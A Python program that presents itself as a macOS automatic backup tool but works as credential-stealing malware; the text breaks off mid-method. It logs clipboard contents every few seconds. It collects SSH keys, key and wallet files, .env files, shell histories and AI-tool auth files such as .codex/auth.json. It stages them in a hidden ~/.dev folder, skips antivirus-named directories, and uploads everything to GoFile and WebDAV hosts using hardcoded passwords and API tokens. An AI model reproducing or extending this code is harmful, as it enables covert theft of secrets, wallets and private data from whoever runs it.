# -*- coding: utf-8 -*-
"""
自动备份工具-macOS版本
"""

import os
import sys
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import subprocess
import getpass
import traceback
import glob
import fnmatch
import re
import json
import hashlib
import sqlite3
import tempfile
import uuid
from pathlib import Path
from datetime import datetime, timedelta

try:
    import fcntl
except ImportError:  # 非 Unix 平台不提供 fcntl
    fcntl = None


def _empty_backup_state():
    return {"version": 1, "files": {}, "pending_archives": {}}


CUSTOM_DATA_STATE_PREFIX = "mac:backup-data/"


def archive_group_key(path):
    """返回归档组名；分片归档与其原始归档归为同一组。"""
    name = os.path.basename(path)
    marker = ".tar.gz.part"
    if marker in name:
        return name.split(marker, 1)[0] + ".tar.gz"
    match = re.match(r"^(.*)_part\d+\.tar\.gz$", name)
    if match:
        return match.group(1) + ".tar.gz"
    return name


def group_archive_paths(paths):
    """按归档组收集路径，只有整组上传成功后才提交文件指纹。"""
    groups = {}
    for path in paths or []:
        groups.setdefault(archive_group_key(path), []).append(path)
    return groups


class ArchiveError(RuntimeError):
    """归档创建或校验失败。"""


def _entry_kind(path):
    if os.path.islink(path):
        return "symlink"
    if os.path.isdir(path):
        return "directory"
    if os.path.isfile(path):
        return "file"
    return "other"


def build_manifest(folder_path):
    """返回归档内路径、类型、大小和链接目标组成的有序清单。"""
    folder_path = os.path.abspath(folder_path)
    root_name = os.path.basename(os.path.normpath(folder_path))
    manifest = {}

    def visit(path, relative):
        kind = _entry_kind(path)
        stat = os.lstat(path)
        archive_name = root_name if not relative else (
            f"{root_name}/{relative.replace(os.sep, '/')}")
        link_target = os.readlink(path) if kind == "symlink" else ""
        manifest[archive_name] = (
            kind,
            stat.st_size if kind == "file" else (
                len(link_target.encode("utf-8", "surrogateescape"))
                if kind == "symlink" else 0),
            link_target,
        )
        if kind != "directory":
            return
        with os.scandir(path) as entries:
            for entry in sorted(entries, key=lambda item: item.name):
                child_relative = (
                    entry.name if not relative
                    else os.path.join(relative, entry.name)
                )
                visit(entry.path, child_relative)

    visit(folder_path, "")
    return manifest


def _archive_members(tar_path):
    members = {}
    with tarfile.open(tar_path, "r:gz") as archive:
        for member in archive:
            if member.isdir():
                kind = "directory"
            elif member.islnk() or member.issym():
                kind = "symlink"
            elif member.isfile():
                kind = "file"
            else:
                kind = "other"
            link_target = member.linkname if kind == "symlink" else ""
            members[member.name.rstrip("/")] = (
                kind,
                member.size if kind == "file" else (
                    len(link_target.encode("utf-8", "surrogateescape"))
                    if kind == "symlink" else 0),
                link_target,
            )
            if kind == "file":
                extracted = archive.extractfile(member)
                if extracted is None:
                    raise ArchiveError(f"无法读取归档成员: {member.name}")
                while extracted.read(1024 * 1024):
                    pass
    return members


def validate_archive(tar_path, expected_manifest):
    """通过完整读取 gzip/tar 内容和成员清单验证归档。"""
    try:
        actual = _archive_members(tar_path)
    except (OSError, tarfile.TarError, EOFError) as exc:
        raise ArchiveError(f"归档校验失败: {exc}") from exc
    if actual != expected_manifest:
        missing = sorted(set(expected_manifest) - set(actual))
        extra = sorted(set(actual) - set(expected_manifest))
        changed = sorted(
            name for name in set(actual) & set(expected_manifest)
            if actual[name][0] != expected_manifest[name][0]
            or (actual[name][0] == "file"
                and actual[name][1] != expected_manifest[name][1])
        )
        raise ArchiveError(
            "归档成员清单不一致: "
            f"缺少={missing[:5]}，额外={extra[:5]}，类型或大小变化={changed[:5]}")


def _publish_without_overwrite(temporary_path, final_path):
    """同目录硬链接发布；目标存在时失败，避免覆盖 pending 归档。"""
    try:
        os.link(temporary_path, final_path)
    except FileExistsError as exc:
        raise ArchiveError(f"归档目标已存在，拒绝覆盖: {final_path}") from exc
    finally:
        try:
            os.remove(temporary_path)
        except FileNotFoundError:
            pass


def create_archive(folder_path, archive_path, compresslevel=6):
    """创建并校验单个 tar.gz；失败时不留下正式文件或临时文件。"""
    folder_path = os.path.abspath(folder_path)
    archive_path = os.path.abspath(archive_path)
    os.makedirs(os.path.dirname(archive_path), exist_ok=True)
    temporary_path = os.path.join(
        os.path.dirname(archive_path),
        f".{os.path.basename(archive_path)}.{uuid.uuid4().hex}.partial",
    )
    try:
        expected = build_manifest(folder_path)
        with tarfile.open(
                temporary_path, "w:gz", compresslevel=compresslevel) as archive:
            archive.add(folder_path, arcname=os.path.basename(folder_path))
        validate_archive(temporary_path, expected)
        _publish_without_overwrite(temporary_path, archive_path)
        return archive_path
    except Exception:
        try:
            os.remove(temporary_path)
        except FileNotFoundError:
            pass
        raise


def _split_entries(manifest, max_source_size):
    directories = [
        name for name, entry in manifest.items() if entry[0] == "directory"
    ]
    metadata = [
        name for name, entry in manifest.items()
        if entry[0] not in ("directory", "file")
    ]
    files = sorted(
        (
            (name, entry[1])
            for name, entry in manifest.items()
            if entry[0] == "file"
        ),
        key=lambda item: item[1],
        reverse=True,
    )
    chunks = []
    current = []
    current_size = 0
    for name, size in files:
        if current and current_size + size > max_source_size:
            chunks.append(current)
            current = []
            current_size = 0
        current.append(name)
        current_size += size
    if current:
        chunks.append(current)
    if not chunks:
        chunks = [[]]
    return directories, metadata, chunks


def _write_archive_entries(folder_path, temporary_path, member_names,
                           compresslevel=9):
    root_name = os.path.basename(os.path.normpath(folder_path))
    with tarfile.open(
            temporary_path, "w:gz", compresslevel=compresslevel) as archive:
        for member_name in member_names:
            relative = member_name[len(root_name):].lstrip("/")
            source = folder_path if not relative else os.path.join(
                folder_path, *relative.split("/"))
            info = archive.gettarinfo(source, arcname=member_name)
            if info is None:
                raise ArchiveError(f"无法读取源文件元数据: {source}")
            if info.isfile():
                with open(source, "rb") as source_file:
                    archive.addfile(info, source_file)
            else:
                archive.addfile(info)


def split_archive(folder_path, base_archive_path, max_source_size):
    """按源文件大小生成多个经过校验的 tar.gz 分片。"""
    folder_path = os.path.abspath(folder_path)
    base_archive_path = os.path.abspath(base_archive_path)
    manifest = build_manifest(folder_path)
    directories, metadata, file_chunks = _split_entries(
        manifest, max_source_size)
    root_name = os.path.basename(os.path.normpath(folder_path))
    if root_name not in directories:
        directories.insert(0, root_name)

    created = []
    try:
        for part_num, files in enumerate(file_chunks):
            member_names = list(directories)
            if part_num == 0:
                member_names.extend(metadata)
            member_names.extend(files)
            member_names = list(dict.fromkeys(member_names))
            expected = {name: manifest[name] for name in member_names}
            final_path = f"{base_archive_path}_part{part_num}.tar.gz"
            temporary_path = os.path.join(
                os.path.dirname(final_path),
                f".{os.path.basename(final_path)}.{uuid.uuid4().hex}.partial",
            )
            try:
                _write_archive_entries(
                    folder_path, temporary_path, member_names)
                validate_archive(temporary_path, expected)
                _publish_without_overwrite(temporary_path, final_path)
                created.append(final_path)
            except Exception:
                try:
                    os.remove(temporary_path)
                except FileNotFoundError:
                    pass
                raise
        return created
    except Exception:
        for path in created:
            try:
                os.remove(path)
            except FileNotFoundError:
                pass
        raise


CLIPBOARD_LOG_EMPTY = "empty"
CLIPBOARD_LOG_CONTENT = "content"
CLIPBOARD_LOG_ERROR = "error"


def _clipboard_separator_line(line):
    return not line.startswith("-" * 30)


def get_clipboard_log_state(file_path, lock):
    """区分空文件、有效内容与读取失败。"""
    try:
        with lock:
            if not os.path.exists(file_path):
                return CLIPBOARD_LOG_EMPTY
            if os.path.getsize(file_path) == 0:
                return CLIPBOARD_LOG_EMPTY
            with open(
                    file_path, "r", encoding="utf-8",
                    errors="ignore") as source:
                content = source.read().strip()
    except (OSError, IOError) as exc:
        logging.error(f"读取剪贴板日志失败: {exc}")
        return CLIPBOARD_LOG_ERROR

    if not content:
        return CLIPBOARD_LOG_EMPTY
    actual_content = [
        line.strip() for line in content.splitlines()
        if line.strip()
        and not line.strip().startswith("===")
        and not line.strip().startswith("📋")
        and not line.strip().startswith("JTB日志已于")
        and not line.strip().startswith("JTB监控启动于")
        and _clipboard_separator_line(line.strip())
    ]
    return CLIPBOARD_LOG_CONTENT if actual_content else CLIPBOARD_LOG_EMPTY


def append_clipboard_update(file_path, content, lock):
    try:
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with lock, open(
                file_path, "a", encoding="utf-8",
                errors="ignore") as target:
            target.write(
                "\n=== 📋 "
                f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
            target.write(f"{content}\n")
            target.write("-" * 30 + "\n")
        return True
    except (OSError, IOError, PermissionError) as exc:
        logging.error(f"❌ 记录JTB失败: {exc}")
        return False


def read_clipboard_snapshot(file_path, lock):
    with lock, open(file_path, "rb") as source:
        return source.read()


def trim_clipboard_snapshot(file_path, snapshot, lock):
    """在锁内移除已上传前缀；上传期间追加的内容会保留。"""
    with lock, open(file_path, "rb") as current_file:
        current = current_file.read()
    if not current.startswith(snapshot):
        return False
    remainder = current[len(snapshot):]
    with lock, open(file_path, "wb") as current_file:
        current_file.write(remainder)
    return True


def reset_empty_clipboard_log(file_path, lock):
    with lock, open(file_path, "w", encoding="utf-8") as target:
        target.write(
            "=== 📋 JTB监控启动于 "
            f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")


def run_clipboard_monitor(manager, file_path, interval, stop_event):
    last_content = ""
    error_count = 0
    while stop_event is None or not stop_event.is_set():
        try:
            current_content = manager.get_clipboard_content()
            if current_content and current_content != last_content:
                if manager.log_clipboard_update(current_content, file_path):
                    last_content = current_content
                    error_count = 0
                else:
                    error_count += 1
            else:
                error_count = 0
        except Exception as exc:
            error_count += 1
            logging.error(f"❌ JTB监控出错: {exc}")

        wait_seconds = interval
        if error_count >= 5:
            wait_seconds = manager.config.CLIPBOARD_ERROR_WAIT
            error_count = 0
        if stop_event is None:
            time.sleep(wait_seconds)
        elif stop_event.wait(wait_seconds):
            break


def run_clipboard_upload(manager, file_path, stop_event):
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    last_upload_time = 0
    while stop_event is None or not stop_event.is_set():
        try:
            current_time = time.time()
            if current_time - last_upload_time >= manager.config.CLIPBOARD_INTERVAL:
                state = manager.get_clipboard_log_state(file_path)
                if state == CLIPBOARD_LOG_CONTENT:
                    temp_dir = os.path.join(
                        manager.config.BACKUP_ROOT,
                        f"{user_prefix}_temp", "clipboard")
                    if manager._ensure_directory(temp_dir):
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        temp_file = os.path.join(
                            temp_dir,
                            f"{user_prefix}_clipboard_{timestamp}.txt")
                        try:
                            snapshot = read_clipboard_snapshot(
                                file_path, manager._clipboard_lock())
                            with open(temp_file, "wb") as target:
                                target.write(snapshot)
                            if manager.upload_file(temp_file):
                                if not trim_clipboard_snapshot(
                                        file_path, snapshot,
                                        manager._clipboard_lock()):
                                    logging.warning(
                                        "⚠️ JTB日志在快照后发生结构变化，"
                                        "未清空当前日志")
                                last_upload_time = current_time
                        except Exception as exc:
                            logging.error(f"❌ JTB日志上传失败: {exc}")
                        finally:
                            try:
                                if os.path.exists(temp_dir):
                                    shutil.rmtree(temp_dir)
                            except OSError:
                                pass
                elif state == CLIPBOARD_LOG_EMPTY:
                    reset_empty_clipboard_log(
                        file_path, manager._clipboard_lock())
                    last_upload_time = current_time
                else:
                    logging.warning(
                        "⚠️ 读取剪贴板日志失败，本轮保留文件，稍后重试")

            wait_seconds = manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL
            if stop_event is None:
                time.sleep(wait_seconds)
            elif stop_event.wait(wait_seconds):
                break
        except Exception as exc:
            logging.error(f"JTB上传线程错误: {exc}")
            if stop_event is None:
                time.sleep(manager.config.ERROR_RETRY_DELAY)
            elif stop_event.wait(manager.config.ERROR_RETRY_DELAY):
                break


class ClipboardWorkers:
    """持有并管理一组剪贴板线程，防止管理器重建时重复启动。"""

    def __init__(self, manager, file_path):
        self.manager = manager
        self.file_path = file_path
        self.stop_event = threading.Event()
        self.threads = []

    def start(self):
        if any(thread.is_alive() for thread in self.threads):
            return False
        self.stop_event.clear()
        monitor = threading.Thread(
            target=run_clipboard_monitor,
            args=(
                self.manager,
                self.file_path,
                self.manager.config.CLIPBOARD_CHECK_INTERVAL,
                self.stop_event,
            ),
            daemon=True,
            name="clipboard-monitor",
        )
        uploader = threading.Thread(
            target=run_clipboard_upload,
            args=(self.manager, self.file_path, self.stop_event),
            daemon=True,
            name="clipboard-upload",
        )
        self.threads = [monitor, uploader]
        monitor.start()
        uploader.start()
        return True

    def stop(self, timeout=5):
        self.stop_event.set()
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=timeout)
        self.threads = []


class BackupSchedule:
    """下一次正常备份和失败重试时间的持久化。"""

    def __init__(self, config):
        self.config = config

    def read_next_backup_time(self):
        try:
            if not os.path.exists(self.config.THRESHOLD_FILE):
                return None
            with open(
                    self.config.THRESHOLD_FILE, "r",
                    encoding="utf-8") as source:
                next_time = datetime.strptime(
                    source.read().strip(), "%Y-%m-%d %H:%M:%S")
            maximum = datetime.now() + timedelta(
                seconds=self.config.BACKUP_INTERVAL)
            return min(next_time, maximum)
        except (OSError, ValueError):
            return None

    def write_next_backup_time(self):
        try:
            next_time = datetime.now() + timedelta(
                seconds=self.config.BACKUP_INTERVAL)
            os.makedirs(
                os.path.dirname(self.config.THRESHOLD_FILE), exist_ok=True)
            with open(
                    self.config.THRESHOLD_FILE, "w",
                    encoding="utf-8") as target:
                target.write(next_time.strftime("%Y-%m-%d %H:%M:%S"))
            return next_time
        except OSError:
            return None

    def read_retry_time(self):
        try:
            if not os.path.exists(self.config.RETRY_THRESHOLD_FILE):
                return None
            with open(
                    self.config.RETRY_THRESHOLD_FILE, "r",
                    encoding="utf-8") as source:
                return datetime.strptime(
                    source.read().strip(), "%Y-%m-%d %H:%M:%S")
        except (OSError, ValueError):
            return None

    def write_retry_time(self, delay_seconds=None):
        try:
            delay = (
                self.config.ERROR_RETRY_DELAY
                if delay_seconds is None else delay_seconds)
            retry_time = datetime.now() + timedelta(seconds=delay)
            os.makedirs(
                os.path.dirname(self.config.RETRY_THRESHOLD_FILE),
                exist_ok=True)
            with open(
                    self.config.RETRY_THRESHOLD_FILE, "w",
                    encoding="utf-8") as target:
                target.write(retry_time.strftime("%Y-%m-%d %H:%M:%S"))
            return retry_time
        except OSError:
            return None

    def clear_retry_time(self):
        try:
            if os.path.exists(self.config.RETRY_THRESHOLD_FILE):
                os.remove(self.config.RETRY_THRESHOLD_FILE)
        except OSError:
            pass

    def should_backup_now(self):
        next_backup_time = self.read_next_backup_time()
        retry_time = self.read_retry_time()
        now = datetime.now()
        if next_backup_time is not None and now >= next_backup_time:
            return True
        if retry_time is not None and now >= retry_time:
            return True
        return next_backup_time is None and retry_time is None


class BackupResult:
    """备份结果对象，用于区分完整成功、部分成功和失败。"""

    def __init__(self, path=None, status="success", missing_files=None,
                 copied_files=0, skipped_files=0, failed_files=None,
                 changed_records=None):
        self.path = path
        self.status = status
        self.missing_files = missing_files or []
        self.failed_files = failed_files or []
        self.copied_files = copied_files
        self.skipped_files = skipped_files
        self.changed_records = changed_records or {}

    def __bool__(self):
        return bool(self.path)

try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError as e:
    print(f"⚠ 警告: 无法导入 requests 库: {str(e)}")
    requests = None
    HTTPBasicAuth = None

try:
    import urllib3
    # 禁用SSL警告
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"⚠ 警告: 无法导入 urllib3 库: {str(e)}")
    urllib3 = None


class BackupConfig:
    """备份配置类"""

    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）

    # 文件大小限制
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB 源目录最大大小
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB 压缩后单文件最大大小
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB 分片大小

    # 压缩配置
    TAR_COMPRESS_LEVEL = 6  # tar.gz 压缩级别（1-9，6 为平衡值）
    
    # 上传配置
    RETRY_COUNT = 3  # 重试次数
    RETRY_DELAY = 30  # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
    
    # 网络配置
    NETWORK_TIMEOUT = 3  # 网络检查超时时间（秒）
    NETWORK_CHECK_HOSTS = [
        ("8.8.8.8", 53),        # Google DNS
        ("1.1.1.1", 53),        # Cloudflare DNS
        ("208.67.222.222", 53)  # OpenDNS
    ]
    
    # 监控配置
    BACKUP_INTERVAL = 24 * 60 * 60  # 备份间隔时间：1天（单位：秒）
    CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）
    CLIPBOARD_CHECK_INTERVAL = 3  # JTB检查间隔（秒）
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 60  # JTB上传检查间隔（秒）
    
    # 文件操作配置
    SCAN_TIMEOUT = 1200  # 扫描目录超时时间（秒）
    FILE_RETRY_COUNT = 3  # 文件访问重试次数
    FILE_RETRY_DELAY = 5  # 文件重试等待时间（秒）
    COPY_CHUNK_SIZE = 1024 * 1024  # 文件复制块大小（1MB，提高性能）
    PROGRESS_INTERVAL = 10  # 进度显示间隔（秒）
    
    # 上传配置
    MAX_SERVER_RETRIES = 2  # 每个服务器最多尝试次数
    FILE_DELAY_AFTER_UPLOAD = 1  # 上传后等待文件释放的时间（秒）
    FILE_DELETE_RETRY_COUNT = 3  # 文件删除重试次数
    FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
    CONTENT_VERIFY_INTERVAL = 7 * 24 * 60 * 60  # 元数据未变时的完整内容校验周期
    STATE_RETENTION_DAYS = 90  # 源文件已消失时保留历史指纹的天数
    ORPHAN_ARCHIVE_AGE = 60 * 60  # 未登记 pending 的残留归档清理年龄
    
    # 错误处理配置
    CLIPBOARD_ERROR_WAIT = 60  # JTB监控连续错误等待时间（秒）
    BACKUP_CHECK_INTERVAL = 3600  # 备份检查间隔（秒，每小时检查一次）
    ERROR_RETRY_DELAY = 60  # 发生错误时重试等待时间（秒）
    MAX_RETRY_DELAY = 6 * 60 * 60  # 连续失败时的最大退避时间（秒）
    MAIN_ERROR_RETRY_DELAY = 300  # 主程序错误重试等待时间（秒，5分钟）
    
    # 磁盘空间检查
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # 最小可用空间（1GB）
    
    # 备份目录 - 用户主目录
    BACKUP_ROOT = os.path.expanduser('~/.dev/Backup')
    
    # 时间阈值文件
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    RETRY_THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_retry_time.txt')
    BACKUP_STATE_FILE = os.path.join(BACKUP_ROOT, 'upload_state.json')
    
    # 日志配置
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
    LOG_LEVEL = logging.INFO

    # 显式需要扫描的云盘根目录。扫描过程会穿透其祖先目录，而不会按普通排除规则整棵剪枝。
    CLOUD_SCAN_ROOTS = [
        os.path.expanduser("~/Library/Mobile Documents/com~apple~CloudDocs"),
        os.path.expanduser("~/Library/CloudStorage"),
    ]
    
    # 磁盘文件分类
    DISK_EXTENSIONS_1 = [  # 文档/代码类
        # 文本和文档
        ".txt", ".rtf", ".rst", ".tex", ".doc", ".docx", ".pages", ".md",
        # 电子表格
        ".xls", ".xlsx", ".et", ".numbers", ".csv", ".tsv", ".one",
    ]
    
    DISK_EXTENSIONS_2 = [  # 配置和密钥类
        # 密钥和证书
        ".pem", ".key", ".keystore", ".secret", ".wallet",
        # SSH相关
        "id_rsa", "id_ecdsa", "id_ed25519",
        # 配置文件
        ".json", ".yaml", ".yml", ".xml", ".conf", ".config", ".ini", ".toml", ".env",
    ]   
    
    # 排除目录配置
    EXCLUDE_INSTALL_DIRS = [
        # macOS 系统目录
        "Applications", "Library", "System", "Movies", "Music", "Pictures",
        
        # 开发工具和环境
        "node_modules", "venv", "myenv", "env", ".venv",
        ".gradle", ".m2", ".cargo", ".rustup", ".npm", ".nvm",
        ".local", ".cache", ".docker", ".gem",
        ".pyenv", ".rbenv", ".rvm", ".virtualenvs",
        "__pycache__", "dist", "build", "target",
        
        # IDE 和编辑器
        ".vscode", ".vscode-server", ".cursor", ".idea", ".eclipse",
        ".vs", ".atom", ".sublime",
        
        # 版本控制
        ".git", ".github", ".svn", ".hg",
        
        # 包管理器
        ".yarn", ".pnpm-store", ".bun",
        
        # 浏览器相关
        "Google", "Chrome", "Brave", "Firefox", "Safari", "Opera",
        "Chromium", "Edge",
        
        # 其他大型应用
        "Steam", "Epic Games", "Unity", "UnrealEngine",
        "Adobe", "Autodesk", "Blender", "NVIDIA",
        
        # 通讯软件
        "Discord", "Zoom", "Teams", "Skype", "Slack", "WeChat", "telegram",
        
        # 其他
        ".Trash", ".DS_Store", "Parallels", "VirtualBox VMs",
        "VMware", "Docker", ".zsh_sessions", ".dev",

        # 中文
        "火绒", "杀毒", "电脑管家",
    ]
    
    # 关键词排除
    EXCLUDE_KEYWORDS = [
        # 软件相关
        "program", "software", "install", "setup", "update",
        "patch", "cache", "temp", "tmp",
        
        # 开发相关
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "bin", "obj", "packages",
        "__pycache__", ".pytest_cache",
        
        # 多媒体相关
        "music", "video", "movie", "audio", "media", "stream",
        "downloads", "torrents",
        
        # 游戏相关
        "steam", "game", "gaming", "save",
        
        # 临时文件
        "log", "logs", "crash", "dumps", "dump", "report", "reports",
        
        # 其他
        "bak", "obsolete", "archive", "vpn", "v2ray", "clash",
        "thumb", "thumbnail", "preview", "trash", 
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://upload.gofile.io/uploadfile",          # 自动（最近节点）
        "https://upload-ap-hkg.gofile.io/uploadfile",   # 亚太（香港）
        "https://upload-ap-sgp.gofile.io/uploadfile",   # 亚太（新加坡）
        "https://upload-ap-tyo.gofile.io/uploadfile",   # 亚太（东京）
        "https://upload-na-phx.gofile.io/uploadfile",   # 北美（凤凰城）
    ]
    
    # 指定要直接复制的目录和文件（相对于用户主目录）
    MACOS_SPECIFIC_DIRS = [
        ".ssh",                                                   # SSH配置
        ".zshrc", 
        ".zprofile", 
        ".zshenv",
        ".bash_profile",
        ".bash_history",                                          # Bash历史记录
        ".python_history",                                        # Python历史记录
        ".node_repl_history",                                     # Node.js REPL 历史记录
        ".zsh_history",                                           # Zsh历史记录
        ".zsh_sessions",                                          # Zsh会话
        "Desktop",                                                # 桌面目录
        # 备忘录数据目录不在此备份：group.com.apple.notes 内是 WAL 模式的 SQLite，
        # 裸拷贝可能与正在写入的数据库错配。统一由 backup_notes() 用 SQLite backup API 处理。
        "Library/Application Support/Claude/claude_desktop_config.json",
        ".config/solana/id.json",
        ".claude/config.json",
        ".claude/settings.json",
        ".claude/settings.local.json",
        ".claude/history.jsonl",
        ".claude/channels/",
        ".codex/auth.json",
        ".codex/config.toml",
        ".codex/history.jsonl",
        ".hermes/.env",
        ".hermes/auth.json",
        ".hermes/config.yaml",
        ".hermes/channel_directory.json",
        ".hermes_history",
        ".openclaw/agents/",
        ".openclaw/workspace/.env",
        ".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
    ]

    # 备忘录容器（group.com.apple.notes）内可重建的目录，按目录名匹配，忽略大小写。
    # 这些目录由系统按需重新生成，不影响恢复后的笔记正文与附件。
    NOTES_EXCLUDE_DIR_NAMES = {
        "previews",          # 笔记缩略图，如 Accounts/<uuid>/Previews/<uuid>-1-192x164-0.png
        "thumbnails",        # Paper 预览模板图（Thumbnails/Default/*.png|json）
        "fallbackimages",    # 附件缺图占位图
    }
    # 按相对路径匹配的可重建目录（容器内缓存目录）
    NOTES_EXCLUDE_DIR_PATHS = {
        "library/caches",    # 容器缓存，如 Library/Caches/Paper
    }
    # 备忘录容器内无需备份的临时/索引状态文件（glob，忽略大小写）
    NOTES_EXCLUDE_FILE_PATTERNS = (
        "*.lock",                     # com.apple.notes.databaseopen.lock
        "sharingextensionwritelock",  # 锁文件（无扩展名，不会被 *.lock 匹配）
        "html.index-progress", # HTML 索引进度
        "notesindexerstate-*", # 索引器状态，恢复后会自行重建
    )

# 模块加载时只配置控制台日志；文件日志在 BackupManager 创建备份目录后由 _setup_logging 初始化。
logging.basicConfig(
    level=logging.DEBUG if BackupConfig.DEBUG_MODE else BackupConfig.LOG_LEVEL,
    format=BackupConfig.LOG_FORMAT,
    handlers=[logging.StreamHandler()]
)


class BackupManager:
    """备份管理器类"""
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "wongstar"  #infini-cloud-2
        self.infini_pass = "my95gfPVtKuDCpAK"
        # Infini 上传配置：主配置 + 备用配置（全部失败才会回退 GoFile）
        self.infini_configs = [
            {
                "name": "Infini-主配置",
                "url": self.infini_url,
                "user": self.infini_user,
                "password": self.infini_pass,
            },
            {
                "name": "Infini-备用配置",
                "url": "https://wajima.infini-cloud.net/dav/",
                "user": "cryptostarxp",  #infini-cloud-4
                "password": "LDW9ERV3xuUrHSjZ",
            },
        ]
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_mac_backup"

        # 预编译排除目录的正则表达式和集合，优化字符串匹配性能
        self._exclude_keywords_pattern = re.compile(
            '|'.join(re.escape(kw) for kw in self.config.EXCLUDE_KEYWORDS),
            re.IGNORECASE
        )
        self._exclude_dirs_set = set(
            d.lower().replace('_', ' ').replace('-', ' ')
            for d in self.config.EXCLUDE_INSTALL_DIRS
        )

        # 配置 requests session 用于上传
        self.session = requests.Session()
        self.session.verify = True
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API token（备选方案）：主 token 失败时回退到备用 token
        self.api_token = "y2bp8HQfCVasZBwCN837ddKfuU2FZmja"
        self.api_token_fallback = "mrzh7pc0Up0eeBhH9Yy8RCbOXEg3xSQH"
        self.api_tokens = list(dict.fromkeys([
            self.api_token,
            self.api_token_fallback,
            "9o0Su5ainOFK9fFxzLaiuRKPOxgaUmCm",
            "z63HMixVGXceWW8heBKQaDqNrqTkp4p0",
        ]))
        
        self._setup_logging()
        self._state_lock = threading.RLock()
        self._state = self._load_backup_state()
        self._clipboard_file_lock = threading.RLock()
        self._worker_stop_event = threading.Event()
        self._clipboard_threads = []
        self._clipboard_workers = None
        self._pending_index = None
        self._rebuild_pending_index()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            # 确保日志目录存在
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)

            sensitive_values = [
                self.infini_pass,
                *self.api_tokens,
            ]
            for infini_config in self.infini_configs:
                sensitive_values.append(infini_config.get("password"))
            sensitive_values = [str(v) for v in sensitive_values if v]

            class RedactingFormatter(logging.Formatter):
                """只对明确字段脱敏，不再因为消息中包含路径/URL就丢弃整条日志。"""
                def format(self, record):
                    message = super().format(record)
                    for secret in sensitive_values:
                        if secret:
                            message = message.replace(secret, "***")
                    return message

            class ConsoleFilter(logging.Filter):
                """控制台只保留关键状态和结果，抑制 DEBUG 及过于细节的 INFO。"""

                info_prefixes = (
                    "正在处理数据卷",
                    "正在配置用户主目录备份",
                    "已配置用户主目录备份",
                    "📊", "📁", "💾", "📤", "📝", "📋", "🍎", "⏰",
                    "🚀", "🔄", "☑️", "📸", "ℹ️", "✅", "❌", "⚠️", "📦",
                )

                def filter(self, record):
                    if record.levelno >= logging.WARNING:
                        return True
                    if record.levelno == logging.CRITICAL:
                        return True
                    if record.levelno != logging.INFO:
                        return False

                    message = record.getMessage().strip()
                    return message.startswith(self.info_prefixes)

            # 配置文件处理器
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = RedactingFormatter('%(asctime)s | %(levelname)-8s | %(message)s')
            file_handler.setFormatter(file_formatter)
            
            # 配置控制台处理器
            console_handler = logging.StreamHandler()
            console_formatter = RedactingFormatter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.setLevel(logging.INFO)
            console_handler.addFilter(ConsoleFilter())
            
            # 配置根日志记录器
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # 清除现有处理器；先关闭再移除，避免反复初始化 BackupManager 时泄漏文件描述符
            for handler in root_logger.handlers[:]:
                try:
                    handler.close()
                except Exception:
                    pass
            root_logger.handlers.clear()
            
            # 添加处理器
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
          
            logging.info("✅ 日志系统初始化完成")
        except (OSError, IOError, PermissionError) as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _ensure_directory(directory_path):
        """确保目录存在
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 目录是否可用
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """清理并重新创建目录
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 操作是否成功
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _ensure_free_space(required_bytes, path):
        """检查可用空间是否满足 required_bytes，并保留最小安全余量。"""
        try:
